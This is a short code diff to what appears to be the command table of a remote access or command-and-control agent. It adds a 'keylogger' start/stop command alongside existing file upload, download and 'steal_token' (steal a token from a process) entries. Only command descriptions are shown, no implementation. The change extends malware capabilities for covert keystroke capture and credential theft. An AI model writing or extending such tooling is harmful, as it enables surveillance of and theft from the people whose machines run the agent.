@@ -34,6 +34,7 @@ AGENT_COMMANDS = {
     "cd": "Change working directory (native, cd <path>)",
     "ls": "Directory listing (native, ls [path])",
     "cat": "Read file contents (native, cat <path>)",
+    "keylogger": "Start/stop keystroke logger (keylogger start|stop)",
     "upload": "Upload file (upload <local> <remote>)",
     "download": "Download file (download <remote> [local])",
     "steal_token": "Steal token from PID (steal_token <pid>)",
